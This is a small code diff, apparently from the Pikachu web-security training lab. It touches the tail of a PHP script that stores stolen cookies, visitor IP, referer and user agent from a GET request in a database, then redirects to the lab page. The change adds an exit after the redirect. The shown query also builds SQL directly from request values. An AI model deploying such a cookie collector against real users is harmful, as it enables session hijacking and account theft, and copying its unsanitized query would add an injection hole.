@@ -15,6 +15,6 @@ if(isset($_GET['cookie'])){
     values('$time','$ipaddress','$cookie','$referer','$useragent')";
     $result=mysqli_query($link, $query);
 }
-header("Location:http://192.168.1.4/pikachu/index.php");//重定向到一个可信的网站
+header("Location:http://192.168.1.4/pikachu/index.php");exit;//重定向到一个可信的网站
 
 ?>
